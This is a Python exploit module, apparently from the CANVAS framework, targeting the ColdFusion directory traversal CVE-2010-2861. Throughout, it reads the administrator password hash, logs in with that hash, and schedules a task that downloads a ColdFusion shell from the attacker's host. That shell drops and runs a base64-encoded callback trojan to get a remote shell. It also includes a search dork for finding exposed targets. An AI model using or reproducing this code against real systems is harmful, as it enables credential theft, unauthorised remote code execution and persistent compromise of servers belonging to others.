#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import random
import base64
import threading
from Queue import Queue

#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit
import libs.spkproxy as spkproxy #for urlopen
import re

import hmac
import hashlib
import time
import socket #to check for open port to bind multiple web servers to (for massattack)

NAME="ColdFusion Directory Traversal"
DESCRIPTION="ColdFusion Directory Traversal"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']        = "http://www.adobe.com"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"]    = "http://www.adobe.com/support/security/bulletins/apsb10-18.html"
DOCUMENTATION["CVE Name"]      = "CVE-2010-2861"
DOCUMENTATION["CVE URL"]       = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2861"
DOCUMENTATION['Google Dorks'] = ["inurl:/CFIDE/administrator/"]
DOCUMENTATION["Notes"]         = """This is a multi-step exploit. The steps include:
1 - Exploit the directory traversal to read the configuration file containing the CF admin password hash
2 - Login in with the hash (without knowing the plaintext)
3 - Attempt to discover the web document root (otherwise default to \inetpub\wwwroot)
4 - Create a scheduled task that will download a remote .cfm file
5 - Run the remote .cfm file to execute our CANVAS callback trojan
6 - Enjoy our SYSTEM shell :)
"""
DOCUMENTATION["Things to consider"]="""
1 - A remote file (i-test10-1.cfm) will be left in the webroot as well as the CANVAS callback trojan (CF8AdminXXYY.exe)
2 - When creating a ColdFusion Task a time must be specified.  For now this is the current time relative to the CANVAS host plus 1 minute.
3 - This module assumes that ColdFusion was installed in the default location.
"""
DOCUMENTATION["Known Vulnerable Versions"]=["ColdFusion 8.0, 8.0.1, 9.0, 9.0.1 and earlier versions for Windows, Macintosh and UNIX"]

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] , ["Linux"], ["MAC OS X"] ]
PROPERTY['VERSION'] = [ "All" ]

import urllib, time

NOTES="""
Tested on:
ColdFusion MX 7 and 8 on Windows
ColdFusion 8 on Linux
ColdFusion 8 on Mac OSX
ColdFusion 9 on Win32
"""

CHANGELOG="""
"""

class SERVE_SHELL(threading.Thread):
    def __init__(self, queue, ex_module):
        threading.Thread.__init__(self)
        self.module = ex_module
        self.queue  = queue
        
    def run(self):
        """
        Start a web server to host the ColdFusion shell that we want to execute on the remote server
        """
        
        app = self.module.engine.getModuleExploit("httpserver")
        app.link(self.module)

        app.argsDict["source"]        = self.module.cf_shell
        app.argsDict["datatype"]      = "text/plain"
        app.argsDict["singleexploit"] = "upload"
        app.argsDict["port"]          = self.module.web_server_port
        app.argsDict["auto_port"]     = True
        
        self.module.log("Starting local web server to host ColdFusion shell on port %d." % self.module.web_server_port)
        if not app.listen():
            self.module.log("Could not find port to bind/listen, giving up!")
            self.queue.put(('FAILED', None))
            return False

        self.queue.put(('STARTED', app.port))
        for _ in xrange(0, 100):
            if self.module.state == self.module.HALT: break
            if app.accept():
                self.module.log('Handled our request')
                break

        self.module.log("Shutting down web server..")
        app.state = app.HALT
        app.s.close()
        return True

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.port               = 8500
        self.host               = ""
        self.badstring          = "\x00"
        self.setVersions()
        self.version            = 0
        self.name               = NAME    
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.hostname           = ""
        self.basepath           = ""
        self.hash_traversal     = "/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../VERSION/lib/password.properties%00en"
        self.web_root_traversal = "/CFIDE/administrator/index.cfm?locale=../../../../../../../../../../VERSION/lib/neo-runtime.xml%00en"
        self.admin_hash         = None
        self.trojanfile         = "CFadmin10.exe"
        self.cf_shell           = "CF_directory_traversal_shell.cfm"
        self.coldfusion_versions= []
        self.platform           = "Windows"       
        self.web_server_port    = 8080
        

    def get_random_trojan_name(self):
        sample = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        name =  "CF8Admin%s%s"%("".join(random.sample(sample, 2)), str(random.randint(1,100) ))

        self.trojanfile = "%s.exe"%name
        self.cf_shell = "%s.cfm"%name

        return self.trojanfile

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host               = self.target.interface
        self.getarg("hostname")
        if not self.hostname:
            self.hostname = self.host 
        self.getarg("port")
        self.connector          = self.argsDict.get("basepath", self.basepath)
        self.ssl                = self.argsDict.get("ssl",self.ssl)
        self.basicauth_user     = self.argsDict.get("username", self.basicauth_user)
        self.basicauth_password = self.argsDict.get("password", self.basicauth_password)
        self.trojanfile         = self.get_random_trojan_name()
        self.getarg("web_server_port")

        return 

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def autoDetect(self):
        """
        Attempt to determine what vulnerable software is available to attack. We traverse for the password file
        """
        found = False
        hash = ""

        for v in self.versions.keys():
            for platform in self.versions[v].keys():
                hash_traversal = self.hash_traversal.replace("VERSION",self.versions[v][platform][0])
                response = self.UA.GET(hash_traversal)

                if "password=" in response:
                    for line in response.split("\n"):
                        if "password=" in line and "rdspassword" not in line:
                            hash = line.replace("password=","").strip()
                    
                    self.log("AutoDetect found ColdFusion version %s (%s) installed on the remote machine with admin hash: %s"%(v, platform, hash))
                
                    ##knowledge!
                    self.coldfusion_versions +=[v]
                    self.versions[v][platform]+=[hash]
                    self.platform = platform
                    found = True

        if found:
            return True

        return None

    def setVersions(self):

        self.versions = {6.1:{"Windows":["CFusionMX"],
                              "Linux":["/opt/coldfusionmx"],
                              "OSX":["/Applications/ColdFusionmx"]},
                                   
                         7:{"Windows":["CFusionMX7"],
                            "Linux":["/opt/coldfusionmx7"],
                            "OSX":["/Applications/ColdFusionMX7"]},
                        
                         8:{"Windows":["ColdFusion8"],
                            "Linux":["/opt/coldfusion8"],
                            "OSX":["/Applications/ColdFusion8"]},
                        
                         9:{"Windows":["ColdFusion9"],
                            "Linux":["/opt/coldfusion9"],
                            "OSX":["/Applications/ColdFusion9"]}
                         }

        return 

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.UNIVERSAL_MOSDEF]

    def test(self):
        """
        Quick check for known vulnerable versions
        """ 
        ##try on two common ports
        ##TODO: let the user supply this in the dialog
        for port in [80, 8500]:
            self.setup_UA(port)
            ret = self.autoDetect()
            if ret:
                self.log("ColdFusion server found on port %d"%port)
                self.port = port
                return ret
        return 0


    def make_CF_payload(self):
        """
        Build our ColdFusion 'shell' that will dump our MOSDEF trojan to disk and execute it
        """
        from libs.canvasos import canvasos
        my_os = canvasos(self.platform)
        my_os.arch = "x86"
        self.log("Creating a callback to %s:%s"%(self.callback.ip, self.callback.port))
        
        if self.platform in ["Windows","Linux"]:
            if not self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=my_os, universal=True):
                return False
            
            base64data = base64.encodestring( self.mosdeftrojan )
            
        elif self.platform == "OSX":
            base64data = base64.encodestring( file("backdoors/mosdef_callbacks/osx_intel_universal","rb").read() )
            mosdef_id=self.engine.getNewMosdefID(self)

        ##now we give out the same file
        payload="""
            <cfset path = GetDirectoryFromPath( GetCurrentTemplatePath() ) >
            <cfsavecontent variable="o">BASE64DATA</cfsavecontent>
            <cfset d = toBinary(o)>
            <cfset f = "TROJANFILENAME">
            <cftry>
               <cffile
                   action ="write"
                   file="#path##f#"
                   output=#d#>
            <cfcatch type="any">
            </cfcatch>
            </cftry>
                
                <cfset name = #server.os.name#>
                <cfset additional = #server.os.additionalinformation#>
                <cfif findnocase("Windows", name)>
                <cfset version = "win32">
                <cfelseif findnocase("unix", name)>

                    <cfif findnocase("linux", additional)>
                    <cfset version = "linux">
                    </cfif>
                <cfelseif findnocase("os x", name)>
                <cfset version = "osx">
                </cfif>
                <cfoutput>
                This is running on #version#
                </cfoutput>
                
                <cftry>
                <cfif version eq "win32">
                     <cfexecute name = "cmd" arguments = '/c #path##f#' timeout = "100000"></cfexecute>
                <cfelseif version eq "linux">
                     <cfexecute name = "chmod" arguments = '+x #path##f#' timeout = "100000"></cfexecute>\r\n
                     <cfexecute name = "#path##f#" arguments = "CANVASIP CANVASPORT" timeout = "10"></cfexecute>\r\n
                <cfelseif version eq "osx">
                     <cfexecute name = "chmod" arguments = '+x #path##f#' timeout = "100000"></cfexecute>\r\n
                     <cfexecute name = "#path##f#" arguments = "CANVASIP CANVASPORT MOS_ID" timeout = "10"></cfexecute>\r\n
                </cfif>
                <cfcatch type="any">
                   <cfoutput> some error occured
                   </cfoutput>
                </cfcatch>
                </cftry>
                
                """            
            
        payload = payload.replace("BASE64DATA", base64data).replace("TROJANFILENAME",self.trojanfile)
        payload = payload.replace("CANVASIP",self.callback.ip).replace("CANVASPORT",str(self.callback.port))

        if self.platform == "OSX":
            payload = payload.replace("MOS_ID", str(mosdef_id))
            
        self.log("Creating ColdFusion Shell: %s"%self.cf_shell)
        outfile = file(self.cf_shell,"w")
        outfile.write(payload)
        outfile.close()

        return payload

    def calc_start_time(self):
        """
        The ColdFusion task scheduler needs to be given a time to run and we want our shell yesterday! :)
        """
        #add 60 seconds to our current time just to take into account that the remote server might not be 
        #a few seconds off ... 
        #TODO: get the remote time, if possible
        current = time.ctime(time.time()+60).split()
    
        date = "%s+%s%%2C+%s"%(current[1],current[2],current[4])
        hour,min,sec = current[3].split(":")
        if min[0] == "0" and int(min) < 9:
            t = "%s:0%s"%(hour,int(min))
        else:
            t = "%s:%s"%(hour,int(min))
        self.log("ColdFusion Task will execute our shell at %s"%t)
        return date,t


    def POST_shell(self):
        date, time = self.calc_start_time()
        taskname="testing2010-543"
        web_root = self.get_web_root()
        shell="""TaskName=%s&Start_Date=%s&End_Date=&ScheduleType=Once&StartTimeOnce=%s&Interval=Daily&StartTimeDWM=&customInterval_hour=0&customInterval_min=0&customInterval_sec=0&CustomStartTime=&CustomEndTime=&Operation=HTTPRequest&ScheduledURL=http%%3A%%2F%%2F%s:%s/cfexec.cfm&Username=&Password=&Request_Time_out=&proxy_server=&http_proxy_port=&publish=1&publish_file=%s%s&adminsubmit=Submit&taskNameOrig=%s"""%(taskname,date,time,self.callback.ip, self.web_server_port,web_root, self.cf_shell, taskname)
        self.UA.addHeader("Referer","http://%s:%s/CFIDE/administrator/scheduler/scheduleedit.cfm?submit=Schedule+New+Task"%(self.host,self.port))
        self.UA.addHeader("Content-Type","application/x-www-form-urlencoded")
        
        response = self.UA.POST("/CFIDE/administrator/scheduler/scheduleedit.cfm", shell, noresponse=False)
        #print response

        self.log("The ColdFusion Task has been created.  It may take up to 1 minute to execute the shell.")
        
    def get_admin_hash(self):
        """
        Exploit the traversal bug to pull out the CF administrator hash
        password=5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8
        """
        response = self.UA.GET(self.hash_traversal)
        for line in response.split("\n"):
            if "password=" in line and "rdspassword" not in line:
                self.admin_hash = line.replace("password=","").strip()
        if self.admin_hash:
            self.log("Obtained ColdFusion administrator password hash: %s"%self.admin_hash)
            return 1
        else:
            self.log("Could not obtain ColdFusion administrator hash.  Is the web interface accessible?")
            return 0
        
    def get_web_root(self):
        """
        Ugly parsing of the response to pull out the web server root.  This is so that we don't ever have to "guess" where the web root is
        to put our shell
        """
        req = self.web_root_traversal.replace("VERSION", self.versions[self.version][self.platform][0])
        response = self.UA.GET(req)
        self.log("Attempting to discover web document path")
        lines = response.split("coldfusion.server.ConfigMap")

        for l in lines:
            if "/CFIDE'><string>" in l:
                web_root =  l.split("<var name='/CFIDE'><string>")[1].split("</string>")[0]#.replace("\\CFIDE","").replace("/CFIDE","")
                self.log("Successfully found document path: %s"%web_root)
                if self.platform in ["Linux", "OSX"]:
                    ##want to avoid errors when submitting the task to CF
                    return "/%s/"%web_root
                else:
                    return "%s\\"%web_root
        
        self.log("Could not determine document path.  Assuming \\inetpub\\wwwroot\\cfide\\")
        return "\\inetpub\\wwwroot\\cfide\\"

    def get_salt(self, response):
        for line in response.split("\n"):
            field = "<input name=\"salt\" type=\"hidden\" value=\""
            if field in line:
                self.salt = line.replace(field, "").replace("\">","").replace("\t","").strip()
                return self.salt
        return False

    def hash_the_hash(self, password):
        """
        So that we can login without knowing the plain-text!
        """
        self.salted_admin_hash = hmac.new(self.salt, password, hashlib.sha1).hexdigest()
        self.log("Prepared salted admin hash for login: %s"%self.salted_admin_hash)
        return self.salted_admin_hash.upper()
        
    def login_with_hash(self):
        for v in self.coldfusion_versions:
            self.log("Attempting to login with hash for version %s"%v)
            response = self.UA.GET("/CFIDE/administrator/enter.cfm")
            salt = self.get_salt(response)
            if salt:
                admin_hash = self.versions[v][self.platform][1]
                self.log("using provided salt: %s"%salt)
                post = "cfadminPassword=%s&requestedURL=%%2FCFIDE%%2Fadministrator%%2Findex.cfm%%3F&salt=%s&submit=Login"%(self.hash_the_hash(admin_hash), salt)
                response = self.UA.POST("/CFIDE/administrator/enter.cfm", post, noresponse=False)

                if "Enter your RDS or Admin password below" in response:
                    self.log("Login for version %s failed"%v)
                else:
                    self.log("Successfully logged in version %s with admin hash"%v)
                    self.version = v
                    return 1
            else:
                self.log("Could not obtain the salt to use for hashing.  Is the page available?")
                return 0

    def exec_shell(self):
        """
        Execute our CF shell by requesting it.  The shell is downloaded by CF from our CANVAS host when the created task is run.
        """
        response = self.UA.GET("/CFIDE/%s"%self.cf_shell)
        #print "contents of shell:\n\n%s\n\n"%response
        ##TODO: react to different error messages (POST the shell again, print error messages,etc)
        if "Connection Failure" or "Connection refused" in response:
            #self.log("Coldfusion shell may not be on the server yet ...")
            pass
        elif "some error occured" in response:
            #self.log("ColdFusion shell returned and error when trying to execute callback.  Likely that the shell is being executed more than once (good news! :) ).")
            pass


    def setup_UA(self, port):

        self.getargs()

        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.basicauth_user !="":
            auth=spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
        else:
            auth=None

        useragentstring=protocol+"://"+self.host+":%s"%port+"/"
        print useragentstring
        self.log("useragentstring: %s"%useragentstring)

        self.UA=spkproxy.UserAgent(useragentstring, auth=auth, hostname=self.hostname, exploit=self)
        

        
    def run(self):
        ret = False
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.hostname, self.port))

        self.log("Attacking %s:%d"%(self.hostname,self.port))
        #self.log("Basic Auth User: %s"%self.basicauth_user)
        self.log("VHost: %s"%self.hostname)
        self.log("using version: %s"%self.version)
        login = self.login_with_hash()
        
        if login:
            queue = Queue()
            server = SERVE_SHELL(queue, self)
            server.start()

            # Wait for httpserver notification
            msg = queue.get()
            
            if msg[0] != 'STARTED':
                self.log('Could not start http server, aborting..')
                self.setInfo("%s attacking %s:%d - done (failed)" % (NAME, self.host, self.port))
                return 0

            self.web_server_port = msg[1]
            
            # we were successfull at logging in with the hash
            self.make_CF_payload()
            self.POST_shell()
            
            self.log("server started ...")
            self.log("Now we wait for the task to start.  This could take a minute...")            

            count = 1
            while not self.succeeded and self.state != self.HALT and count <= 100:
                time.sleep(2)
                self.exec_shell()
                self.log("[%s/100] Still waiting for the task to give us a shell ... " % count)
                count +=1
        
        if self.ISucceeded():
            ret = 1
            self.setInfo("%s attacking %s:%d - done (success!)" % (NAME, self.host, self.port))
        else:
            ret = 0
            self.setInfo("%s attacking %s:%d - done (failed)" % (NAME, self.host, self.port))
        return ret


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

